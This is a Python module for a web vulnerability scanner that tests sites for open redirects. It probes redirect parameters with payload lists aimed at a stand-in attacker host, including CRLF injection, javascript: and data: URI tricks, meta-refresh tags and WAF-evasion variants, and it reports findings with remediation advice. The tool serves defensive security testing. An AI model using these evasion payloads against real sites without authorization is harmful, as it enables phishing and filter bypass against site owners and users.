"""
open_redirect_scanner.py — Open Redirect Vulnerability Scanner
==============================================================
Tests URL parameters and form actions for unvalidated redirects.
OWASP: CWE-601 / A01:2021 Broken Access Control
"""
import re, urllib.parse, urllib.request, urllib.error, ssl
from scanners.base_scanner import BaseScanner
from utils.evasion import waf_evade
from utils.callback import build_callback_url

REDIRECT_PARAMS = [
    "redirect","redirect_uri","redirect_url","redirectTo","return","returnTo",
    "return_url","next","next_url","url","goto","go","destination","dest",
    "target","continue","forward","link","location","ref","referer","callback",
    "out","view","back",
]

PAYLOADS = [
    # Protocol-relative & scheme confusion
    "//evil.attacker.com",
    "///evil.attacker.com",
    "//evil.attacker.com:443",
    "https://evil.attacker.com",
    "http://evil.attacker.com",
    "https:%2f%2fevil.attacker.com",
    "http:%2f%2fevil.attacker.com",
    "https:/\\evil.attacker.com",
    # Subdomain confusion
    "https://evil.attacker.com.evil.com",
    "https://evil.attacker.com%40evil.com",
    "https://evil.com@evil.attacker.com",
    # Path & parameter confusion
    "//evil.attacker.com/%2f..",
    "/\\evil.attacker.com",
    "\\evil.attacker.com",
    "..\\evil.attacker.com",
    # CRLF injection
    "%0d%0aLocation: https://evil.attacker.com",
    "%0aLocation: https://evil.attacker.com",
    # Data & javascript
    "data:text/html,<script>location='https://evil.attacker.com'</script>",
    "javascript:location='https://evil.attacker.com'",
    # Unicode/normalization tricks
    "https://evil.attacker.com%5c",
    "https://evil.attacker.com%2f",
    "https：//evil.attacker.com",
]

ATTACKER_DOMAIN = "evil.attacker.com"

CALLBACK_TARGET = build_callback_url("/redirect").replace("https://", "").replace("http://", "")

def _expand_with_waf_evade(payloads: list[str]) -> list[str]:
    expanded = list(payloads)
    for p in payloads:
        for name, variant in waf_evade(p):
            expanded.append(variant)
    return expanded

METAREFRESH_PAYLOADS = [
    '<meta http-equiv="refresh" content="0;url=https://evil.attacker.com">',
    '<meta http-equiv="refresh" content="0;url=//evil.attacker.com">',
    '<meta http-equiv="refresh" content="0;url=http://evil.attacker.com">',
]

JS_REDIRECT_PAYLOADS = [
    "javascript:location.href='https://evil.attacker.com'",
    "javascript:location='https://evil.attacker.com'",
    "javascript:window.location='https://evil.attacker.com'",
    "javascript:document.location='https://evil.attacker.com'",
    "javascript:location.replace('https://evil.attacker.com')",
    "javascript:location.assign('https://evil.attacker.com')",
]

ALL_PAYLOADS_WITH_WAF = _expand_with_waf_evade(PAYLOADS) + METAREFRESH_PAYLOADS + JS_REDIRECT_PAYLOADS


class OpenRedirectScanner(BaseScanner):
    SCANNER_NAME = "Open Redirect Scanner"
    _SCANNER_KEY = "open_redirect"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)
        self._tested = 0
        self._found  = 0
        self._seen: set = set()

    def run(self) -> list:
        self.log("INFO", f"[OpenRedirect] Starting open redirect scan on {self.target}...")
        try:
            endpoints = self._crawl()
            self.log("INFO", f"[OpenRedirect] Testing {len(endpoints)} endpoint(s)")
            for url in endpoints:
                parsed = urllib.parse.urlparse(url)
                qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                candidates = list({
                    p for p in (list(qs.keys()) + REDIRECT_PARAMS)
                    if any(rp.lower() in p.lower() for rp in REDIRECT_PARAMS)
                }) or REDIRECT_PARAMS[:6]
                for param in candidates:
                    if self._probe(url, parsed, param):
                        break

            # Run protocol-relative and data: URI specific checks
            self._check_protocol_relative_redirect()
            self._check_data_uri_redirect()
        except Exception as e:
            self.log("WARNING", f"[OpenRedirect] Error: {e}")

        self.log(
            "SUCCESS" if not self.vulns else "WARNING",
            f"[OpenRedirect] Complete — {self._tested} probe(s) | "
            f"{self._found} open redirect(s) confirmed",
        )
        return self.vulns

    def _crawl(self) -> list:
        try:
            # GAP-ADV: Centralized context
            if self.discovery_context and "urls" in self.discovery_context:
                return [u.get("url") if isinstance(u, dict) else u for u in self.discovery_context["urls"]]
            return [self.target]
        except Exception as e:
            self.log("ERROR", f"[OpenRedirect] _crawl error: {e}")
            return [self.target]

    def _probe(self, url, parsed, param) -> bool:
        base = urllib.parse.urlunparse(parsed._replace(query="", fragment=""))
        for payload in ALL_PAYLOADS_WITH_WAF:
            self._tested += 1
            test_url = f"{base}?{urllib.parse.urlencode({param: payload})}"
            dest = self._follow(test_url)
            if dest and ATTACKER_DOMAIN in dest:
                self._report(url, param, payload, dest)
                return True
            body, status = self._make_request(test_url)
            if body:
                if re.search(r'meta\s+http-equiv=["\']refresh["\']', body, re.I) and ATTACKER_DOMAIN in body:
                    self._report(url, param, payload, f"meta-refresh redirect to evil.attacker.com")
                    return True
                if re.search(r'location(\.href|\.replace|\.assign)?\s*=\s*["\']?https?://evil\.attacker\.com', body, re.I):
                    self._report(url, param, payload, f"JavaScript location redirect to evil.attacker.com")
                    return True
        return False

    def _follow(self, url) -> str | None:
        try:
            headers = {"User-Agent": "LarShield/2.0 Redirect-Probe"}
            headers.update(self.auth_headers or {})
            req = urllib.request.Request(url, headers=headers)
            ctx = self.get_ssl_context()
            resp = urllib.request.urlopen(req, timeout=8, context=ctx)
            return resp.geturl()
        except urllib.error.HTTPError as e:
            location = e.headers.get("Location", "")
            if location:
                return location
            try:
                body = e.read().decode("utf-8", errors="ignore")
                meta = re.search(r'meta\s+http-equiv=["\']refresh["\']\s+content=["\']0;url=([^"\']+)', body, re.I)
                if meta:
                    return meta.group(1)
            except Exception as e:
                self.log("ERROR", f"[OpenRedirect] _follow inner parse error: {e}")
            return ""
        except Exception as ex:
            self.log("ERROR", f"[OpenRedirect] _follow error: {ex}")
            return None
    def _report(self, url, param, payload, dest):
        key = f"{url}:{param}"
        if key in self._seen:
            return
        self._seen.add(key)
        self._found += 1
        self.log("CRITICAL", f"[OpenRedirect] CONFIRMED! Param={param} -> {dest}")
        self.add_vuln(
            title=f"Open Redirect via '{param}' Parameter",
            severity="High",
            category="Open Redirect",
            cvss_score=6.1,
            description=(
                f"The `{param}` parameter at `{url}` redirected the test request to "
                f"`{dest}` using payload `{payload}`.\n\n"
                "Open redirects enable phishing attacks via trusted domain URLs and can "
                "bypass OAuth redirect_uri validation."
            ),
            evidence=f"Redirected to {dest} with payload {payload}",
            payload=payload,
            request_details=f"GET {url}?{param}={payload}",
            response_details=f"Final destination: {dest}",
            confidence="Confirmed",
            remediation=(
                "1. Maintain a server-side allowlist of permitted redirect destinations.\n"
                "2. Validate URLs against the allowlist before issuing 3xx responses.\n"
                "3. Never use raw user input directly in Location headers.\n"
                "4. For OAuth, register exact redirect_uri values with the provider.\n"
                "5. Prefer relative paths for same-site redirects."
            ),
            cwe_ids=["CWE-601"],
            owasp_category="A01:2021 – Broken Access Control",
        )

    # ------------------------------------------------------------------
    def _check_protocol_relative_redirect(self):
        """Check for protocol-relative redirect URLs (//evil.com) on all endpoints."""
        endpoints = self._crawl()
        protocol_payloads = _expand_with_waf_evade([
            "//evil.attacker.com",
            "///evil.attacker.com",
            "//evil.attacker.com:443",
            "//evil.attacker.com/%2f..",
        ])
        for url in endpoints:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            candidates = list(qs.keys()) if qs else REDIRECT_PARAMS[:6]
            for param in candidates:
                for payload in protocol_payloads:
                    self._tested += 1
                    base = urllib.parse.urlunparse(parsed._replace(query="", fragment=""))
                    test_url = f"{base}?{urllib.parse.urlencode({param: payload})}"
                    dest = self._follow(test_url)
                    if dest and "evil.attacker.com" in dest:
                        self._report(url, param, payload, dest)
                        return

    # ------------------------------------------------------------------
    def _check_data_uri_redirect(self):
        """Check if data: URIs are accepted as redirect destinations (CWE-601)."""
        endpoints = self._crawl()
        data_payloads = _expand_with_waf_evade([
            "data:text/html,<script>alert(1)</script>",
            "data:application/xml;base64,PHg+c3lzdGVtLmZvcmdlcnJhZGRyZXNzKCdodHRwczovL2V2aWwuYXR0YWNrZXIuY29tJyk8L3g+",
        ])
        for url in endpoints:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            candidates = list(qs.keys()) if qs else REDIRECT_PARAMS[:3]
            for param in candidates:
                for payload in data_payloads:
                    self._tested += 1
                    base = urllib.parse.urlunparse(parsed._replace(query="", fragment=""))
                    test_url = f"{base}?{urllib.parse.urlencode({param: payload})}"
                    dest = self._follow(test_url)
                    if dest and dest.startswith("data:"):
                        self._found += 1
                        self.log("CRITICAL", f"[OpenRedirect] Data URI redirect at {url}, param={param}")
                        self.add_vuln(
                            title=f"Data URI Redirect via '{param}' Parameter",
                            severity="High",
                            category="Open Redirect",
                            cvss_score=6.1,
                            description=f"The `{param}` parameter at `{url}` accepted a `data:` URI "
                                "as a redirect destination. Data URIs can be used to craft "
                                "phishing pages that look like the legitimate application.",
                            evidence=f"Data URI redirect confirmed: {dest[:80]}",
                            payload=payload,
                            request_details=f"GET {url}?{param}=data:...",
                            response_details=f"Redirect target: {dest[:80]}",
                            confidence="Confirmed",
                            remediation="1. Block data: URIs in redirect parameters.\n"
                                "2. Maintain an allowlist of permitted redirect schemes (https only).\n"
                                "3. Reject redirect URIs with unexpected schemes.",
                            cwe_ids=["CWE-601"],
                            owasp_category="A01:2021 – Broken Access Control",
                        )
                        return
